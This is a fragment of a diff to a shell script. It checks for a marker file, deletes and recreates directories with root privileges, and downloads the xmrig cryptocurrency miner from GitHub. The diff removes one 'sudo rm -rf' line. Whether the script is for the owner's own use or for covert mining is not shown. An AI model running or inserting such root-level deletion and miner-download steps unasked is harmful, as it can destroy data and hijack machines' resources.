@@ -9,7 +9,6 @@ if [ ! -f /etc/proof ]; then
 fi
 
 sudo rm -rf /poppa
-sudo rm -rf /patata
 sudo mkdir /poppa
 sudo wget https://github.com/xmrig/xmrig/archive/v1.0.1.tar.gz -P /poppa
 cd /poppa
